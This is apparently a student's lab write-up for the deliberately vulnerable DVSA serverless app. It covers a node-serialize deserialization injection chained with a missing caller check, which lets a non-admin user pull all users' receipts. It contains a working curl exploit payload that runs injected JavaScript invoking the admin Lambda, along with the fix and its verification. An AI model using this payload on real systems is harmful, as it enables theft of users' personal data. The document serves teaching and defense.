# Lesson 3 — Sensitive Information Disclosure

**Student:** Ibrahim Alshayea  
**Vulnerability class:** Unauthorized Access to Sensitive Data  
**Affected components:** `DVSA-ORDER-MANAGER` + `DVSA-ADMIN-GET-RECEIPT` Lambdas  
**Endpoint:** `POST /Stage/order`

---

## Summary

Two weaknesses combine into a single attack chain:

1. **Event Injection** (Lesson 1): `order-manager.js` calls `serialize.unserialize(event.body)`,
   allowing a regular user to inject JavaScript that runs inside the Lambda.
2. **Missing caller authorization** in `DVSA-ADMIN-GET-RECEIPT`: the admin receipt Lambda has
   no check on who calls it. Lambda-to-Lambda calls use IAM, so any code running inside
   `DVSA-ORDER-MANAGER` can invoke the admin function directly.

The injected code calls `DVSA-ADMIN-GET-RECEIPT` via the AWS SDK, receives a signed S3 URL,
and the URL downloads a zip containing every user's order receipts.

**Impact:** A non-admin user can download all other users' receipts (names, addresses, order details).

---

## Root Cause

- `order-manager.js`: `serialize.unserialize(event.body)` executes attacker-controlled JS (same as Lesson 1).
- `DVSA-ADMIN-GET-RECEIPT`: no caller identity check — it trusts any IAM principal that has
  `lambda:InvokeFunction` permission, and `DVSA-ORDER-MANAGER`'s role has that permission.

---

## Reproduction Steps

### Step 1 — Set environment variables
```bash
export API="https://<id>.execute-api.us-east-1.amazonaws.com/Stage/order"
export TOKEN="<your-non-admin-jwt>"
```

### Step 2 — Send the exploit payload
```bash
bash exploit/exploit.sh
```

Or manually:
```bash
curl -X POST "$API" \
  -H "Content-Type: application/json" \
  -H "authorization: $TOKEN" \
  -d '{
    "action": "_$$ND_FUNC$$_function(){
      var {LambdaClient,InvokeCommand}=require(\"@aws-sdk/client-lambda\");
      var client=new LambdaClient({region:\"us-east-1\"});
      var cmd=new InvokeCommand({
        FunctionName:\"DVSA-ADMIN-GET-RECEIPT\",
        InvocationType:\"RequestResponse\",
        Payload:Buffer.from(JSON.stringify({\"year\":\"2026\",\"month\":\"04\"}))
      });
      client.send(cmd).then(function(d){
        var result=Buffer.from(d.Payload).toString();
        console.error(\"RECEIPT_RESULT:\"+result);
      }).catch(function(e){console.error(\"RECEIPT_ERR:\"+e.message);});
    }()",
    "cart-id": ""
  }'
```

### Step 3 — Get the signed S3 URL from CloudWatch
Go to **CloudWatch → `/aws/lambda/DVSA-ORDER-MANAGER`** → latest log stream.
Find the `RECEIPT_RESULT:` line and copy the `download_url` value.

### Step 4 — Download the receipts zip
Paste the `download_url` into your browser. A zip file downloads containing all order receipts
in the `2026/04/` path.

---

## Evidence

Screenshots to place in `screenshots/`:
- `3.1-curl-command.png` — malicious payload sent as a regular POST /order
- `3.2-cloudwatch-receipt-result.png` — CloudWatch showing the signed S3 URL
- `3.3-downloaded-zip.png` — zip archive with both users' receipt files
- `3.4-post-fix-cloudwatch.png` — clean CloudWatch log after fix

---

## Fix

The primary fix is the same as Lesson 1: replace `serialize.unserialize` with `JSON.parse` in
`order-manager.js`. This eliminates the injection entry point entirely.

**Defense in depth (recommended):**
- Add caller authorization inside `DVSA-ADMIN-GET-RECEIPT` to verify the caller is an admin workflow.
- Restrict the `DVSA-ORDER-MANAGER` IAM role so it cannot invoke `DVSA-ADMIN-GET-RECEIPT`.

See [`fix/iam-policy-order-manager.json`](fix/iam-policy-order-manager.json) for the restricted policy.

---

## Verification

Re-run the identical curl. CloudWatch should show a clean log with **no** `RECEIPT_RESULT` line.

**Billed duration:** ~2041 ms before fix · ~708 ms after (Lambda exits cleanly without async injection).

---

## Takeaway

In serverless architectures, a single code injection in one Lambda gives the attacker all the IAM
permissions that Lambda holds — including the ability to call other functions. Defense in depth
means fixing the injection AND hardening each sensitive function to verify its caller independently.
